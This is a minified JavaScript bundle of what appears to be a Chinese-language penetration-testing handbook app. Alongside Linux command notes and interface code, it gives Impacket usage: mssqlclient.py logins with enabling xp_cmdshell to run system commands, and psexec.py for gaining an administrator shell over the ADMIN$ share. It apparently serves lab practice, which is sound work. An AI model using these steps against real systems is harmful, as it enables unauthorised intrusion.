                                  acm\u610F\u4E49\u5206\u522B\u4E3Aatime\uFF08\u8BBF\u95EE\u65F6\u95F4\uFF09\uFF0Cctime(\u6539\u53D8\u65F6\u95F4\uFF09\uFF0Cmtime\uFF08\u4FEE\u6539\u65F6\u95F4\uFF09\u3002
                                  t\u4EE3\u8868\u5BA2\u89C2\u7EDD\u5BF9\u65F6\u95F4\uFF0C\u53EA\u4F5C\u4E3A\u53C2\u7167\u5C5E\u6027\u5B58\u5728\uFF0C\u683C\u5F0F\u4E3Ayyyy-MM-dd hh:mm:ss\u3002

                              \u5B50\u53D8\u79CD
                                  find ./ -newermt "2016-01-18" ! -newermt '2016-01-19'
                                      \u4FEE\u6539\u65F6\u95F4\uFF0C\u665A\u4E8E\u30102016-01-18\u3011
                                      \u4FEE\u6539\u65F6\u95F4\uFF0C\u4E0D\u665A\u4E8E\u30102016-01-19\u3011

                      \u5E38\u89C1\u9009\u9879
                          \u3010-ls\u3011
                              \u5C06\u7ED3\u679C\u8FDB\u884C\u6253\u5370\u3002        \uFF08\u7C7B\u4F3C\u4E8E\u3010ls\u547D\u4EE4\u3011\uFF09

              \u89E3\u538B\u7F29\u6587\u4EF6

                  \u67E5\u770B\u5185\u5BB9
                      unzip  -l  <\u538B\u7F29\u6587\u4EF6\u8DEF\u5F84>

                  \u89E3\u538B
                      unzip  <\u538B\u7F29\u6587\u4EF6\u8DEF\u5F84>
                          \u89E3\u538B\u5230\u5F53\u524D\u76EE\u5F55

                      unzip  <\u538B\u7F29\u6587\u4EF6\u8DEF\u5F84>  -d  <\u89E3\u538B\u5230\u76EE\u5F55>
                          \u89E3\u538B\u5230\u6307\u5B9A\u76EE\u5F55

                      unzip  <\u538B\u7F29\u6587\u4EF6\u8DEF\u5F84>  -d  <\u89E3\u538B\u5230\u76EE\u5F55>  -o
                          \u89E3\u538B\u5230\u6307\u5B9A\u76EE\u5F55\uFF0C\u8986\u76D6\u539F\u5148\u7684\u6587\u4EF6

                  \u5E38\u89C1\u9009\u9879
                      \u3010-o\u3011
                          \u8986\u76D6\u539F\u5148\u7684\u6587\u4EF6

            `))})},{name:"\u67E5\u770B\u624B\u518C",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u67E5\u770B\u624B\u518C"),`
              man  <\u5177\u4F53\u547D\u4EE4>

                  \u3010h\u3011\uFF0C\u67E5\u770B\u3010man\u3011\u672C\u8EAB\u7684\u5E2E\u52A9

                  \u3010q\u3011\uFF0C\u8FDB\u884C\u9000\u51FA


            `))}]},m={name:"\u3010Linux\u3011_\u3010Unix\u3011_\u624B\u518C",steps:[s,{name:"\u5E38\u89C1\u3010\u9690\u79C1\u6587\u4EF6\u3011",desc:l.a.createElement(l.a.Fragment,null),content:Promise.all([Promise.resolve().then(f.bind(null,"QL8i"))]).then(function(o){var c=Object(R.a)(o,1),b=c[0];return b.\u5E38\u89C1\u9690\u79C1\u6587\u4EF6_\u654F\u611F\u6587\u4EF6_\u91CD\u8981\u914D\u7F6E\u6587\u4EF6_Helper.Linux.then(function(e){return l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                  `,e))})})}]},F=m,k=s},"+ULl":function(nu,U,f){"use strict";f.d(U,"a",function(){return m}),f.d(U,"b",function(){return F}),f.d(U,"c",function(){return k}),f.d(U,"d",function(){return o}),f.d(U,"e",function(){return c});var R=f("k1fw"),h=f("5Dmo"),l=f("3S7+"),j=f("+BJd"),n=f("mr32"),u=f("q1tI"),t=f.n(u),s=f("ysNt");function m(b,e){var v=arguments.length>2&&arguments[2]!==void 0?arguments[2]:!1,D=1.5,d=v?b:t.a.createElement(n.a,{style:{fontSize:"".concat(D,"rem"),lineHeight:"".concat(D/3*5*1.2,"rem"),wordBreak:"inherit",whiteSpace:"inherit"}},b),A=e?t.a.createElement("div",null,d,t.a.createElement("ol",null,[e].flat(1).map(function(E){return t.a.createElement("li",null,E)}))):v?t.a.createElement("span",{style:{display:"inline-block",padding:"5px 12px"}},d):d;return{value:b,label:v?t.a.createElement(l.a,{placement:"leftBottom",title:b}," ",A," "):A}}function F(b,e){return m(b,e)}function k(b,e){return t.a.createElement("span",{style:{marginTop:"4px",display:"inline-block",background:"yellow",fontSize:(e==null?void 0:e.fontSize)||"",lineHeight:(e==null?void 0:e.fontSize)||""}},b)}function o(b,e){var v="\u89C1 \u300A".concat(e,"\u300B \u5185 \u300A").concat(b,"\u300B \u7684\u8BE6\u7EC6\u5185\u5BB9\u3002"),D={background:s.e.getColor("lime",6)||""},d=Object(R.a)({my_reference:!0},m(b,[t.a.createElement("h2",{style:D},v)]));return console.log("sameNameTag",b,d),d}var c=["GB2312","GBK","GB18030","BIG5","Shift_JIS"]},"/kpp":function(nu,U,f){"use strict";var R=f("rePB"),h=f("wx14"),l=f("U8pU"),j=f("q1tI"),n=f.n(j),u=f("TSYQ"),t=f.n(u),s=f("o/2+"),m=f("H84U"),F=function(b,e){var v={};for(var D in b)Object.prototype.hasOwnProperty.call(b,D)&&e.indexOf(D)<0&&(v[D]=b[D]);if(b!=null&&typeof Object.getOwnPropertySymbols=="function")for(var d=0,D=Object.getOwnPropertySymbols(b);d<D.length;d++)e.indexOf(D[d])<0&&Object.prototype.propertyIsEnumerable.call(b,D[d])&&(v[D[d]]=b[D[d]]);return v};function k(b){return typeof b=="number"?"".concat(b," ").concat(b," auto"):/^\d+(\.\d+)?(px|em|rem|%)$/.test(b)?"0 0 ".concat(b):b}var o=["xs","sm","md","lg","xl","xxl"],c=j.forwardRef(function(b,e){var v,D=j.useContext(m.b),d=D.getPrefixCls,A=D.direction,E=j.useContext(s.a),C=E.gutter,y=E.wrap,_=E.supportFlexGap,O=b.prefixCls,B=b.span,r=b.order,P=b.offset,p=b.push,z=b.pull,N=b.className,K=b.children,S=b.flex,T=b.style,H=F(b,["prefixCls","span","order","offset","push","pull","className","children","flex","style"]),q=d("col",O),G={};o.forEach(function(eu){var iu,hu={},Ru=b[eu];typeof Ru=="number"?hu.span=Ru:Object(l.a)(Ru)==="object"&&(hu=Ru||{}),delete H[eu],G=Object(h.a)(Object(h.a)({},G),(iu={},Object(R.a)(iu,"".concat(q,"-").concat(eu,"-").concat(hu.span),hu.span!==void 0),Object(R.a)(iu,"".concat(q,"-").concat(eu,"-order-").concat(hu.order),hu.order||hu.order===0),Object(R.a)(iu,"".concat(q,"-").concat(eu,"-offset-").concat(hu.offset),hu.offset||hu.offset===0),Object(R.a)(iu,"".concat(q,"-").concat(eu,"-push-").concat(hu.push),hu.push||hu.push===0),Object(R.a)(iu,"".concat(q,"-").concat(eu,"-pull-").concat(hu.pull),hu.pull||hu.pull===0),Object(R.a)(iu,"".concat(q,"-rtl"),A==="rtl"),iu))});var ju=t()(q,(v={},Object(R.a)(v,"".concat(q,"-").concat(B),B!==void 0),Object(R.a)(v,"".concat(q,"-order-").concat(r),r),Object(R.a)(v,"".concat(q,"-offset-").concat(P),P),Object(R.a)(v,"".concat(q,"-push-").concat(p),p),Object(R.a)(v,"".concat(q,"-pull-").concat(z),z),v),N,G),$={};if(C&&C[0]>0){var au=C[0]/2;$.paddingLeft=au,$.paddingRight=au}if(C&&C[1]>0&&!_){var uu=C[1]/2;$.paddingTop=uu,$.paddingBottom=uu}return S&&($.flex=k(S),y===!1&&!$.minWidth&&($.minWidth=0)),j.createElement("div",Object(h.a)({},H,{style:Object(h.a)(Object(h.a)({},$),T),className:ju,ref:e}),K)});c.displayName="Col",U.a=c},"1WT5":function(nu,U){nu.exports="data:image/png;base64,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"},"2jYT":function(nu,U,f){"use strict";f.r(U),f.d(U,"Impacket_\u5957\u4EF6_Helper",function(){return t}),f.d(U,"Shell_ReverseShell_\u53CD\u5411\u4EE3\u7406_\u624B\u518C",function(){return m});var R=f("fWQN"),h=f("q1tI"),l=f.n(h),j=f("/qoP"),n=f("ysNt"),u=n.e.singleATag_blank,t=function F(){Object(R.a)(this,F)};t.\u73AF\u5883\u51C6\u5907=`
      \u73AF\u5883\u51C6\u5907
          \u8FDB\u5165\u300Aimpacket\u300B\u6839\u76EE\u5F55\uFF0C\u8FD0\u884C\u300Apython3 -m pip install .\u300B
          \u811A\u672C\u5730\u5740\uFF1A
              \u300A/home/htb-hanshou101/Downloads/impacket/examples/<\u5177\u4F53\u54EA\u5757>\u300B
  `,t["mssqlclient.py"]=`

`.concat(t.\u73AF\u5883\u51C6\u5907,`

      \u4F7F\u7528
          \u67E5\u770B\u5E2E\u52A9
              python3  mssqlclient.py  --help

          \u767B\u5F55
              \u624B\u52A8\u4E8C\u6B21\u8F93\u5165\u5BC6\u7801
                  \u4E00\u822C\u60C5\u51B5
                      python3  mssqlclient.py  <\u57DF>/<\u7528\u6237\u540D>@<IP\u5730\u5740>

                  \u5E26Windows\u51ED\u8BC1
                      python3  mssqlclient.py  <\u57DF>/<\u7528\u6237\u540D>@<IP\u5730\u5740>  -windows-auth

              \u5BC6\u7801\u660E\u6587\u76F4\u63A5\u7528
                  \u4E00\u822C\u60C5\u51B5
                      python3  mssqlclient.py  <\u57DF>/<\u7528\u6237\u540D>:<\u7528\u6237\u5BC6\u7801>@<IP\u5730\u5740>

                  \u5E26Windows\u51ED\u8BC1
                      python3  mssqlclient.py  <\u57DF>/<\u7528\u6237\u540D>:<\u7528\u6237\u5BC6\u7801>@<IP\u5730\u5740>  -windows-auth


          \u5E38\u89C1\u9009\u9879\uFF1A
              \u3010-windows-auth\u3011\uFF0C
                  123

          \u589E\u5F3A\u547D\u4EE4\u6267\u884C        \uFF08\u5728\u3010mssql\u539F\u6709\u547D\u4EE4\u3011\u7684\u57FA\u7840\u4E0A\uFF0C\u505A\u4E86\u589E\u5F3A\uFF09

              help\uFF0C\u67E5\u770B\u5E2E\u52A9

              lcd  <\u8DEF\u5F84>
                  \u6539\u53D8\u3010\u771F\u673A\u3011\u7684\u8DEF\u5F84

              ! <\u5177\u4F53\u547D\u4EE4>
                  \u5728\u3010\u771F\u673A\u3011\u6267\u884C\u547D\u4EE4

              enable_xp_cmdshell\uFF0C\u5F00\u542F

              disable_xp_cmdshell\uFF0C\u5173\u95ED

              xp_cmdshell  <\u5177\u4F53\u547D\u4EE4>
                  \u6267\u884C\u547D\u4EE4

              sp_start_job  <\u5177\u4F53\u547D\u4EE4>
                  \u4F7F\u7528\u3010the sql server agent (blind)\u3011\uFF0C\u6267\u884C\u547D\u4EE4


  `),t["psexec.py"]=`

`.concat(t.\u73AF\u5883\u51C6\u5907,`

      \u4F7F\u7528\uFF1A

          \u80FD\u591F\u4F5C\u4E3A\u3010administrator\u3011\uFF0C\u83B7\u5F97 shell
              \u9700\u8981\u63D0\u524D \u5F97\u5230\u3010\u7BA1\u7406\u5458\u5BC6\u7801\u3011
              \u5229\u7528\u4E86\u3010writable share ADMIN$\u3011\u3001\u3010Uploading file pGRORiNg.exe\u3011\u3001\u3010SVCManager\u3011\u3001\u3010service yYxC\u3011\u3001\u3010Press help for extra shell\u3011\u3002

          \u5C5E\u4E8E\u3010Impacket\u3011\u5957\u4EF6\u3002

          \u8FD0\u884C
              python3  psexec.py  <\u7528\u6237\u540D_\u5982administrator>@<\u76EE\u6807IP>
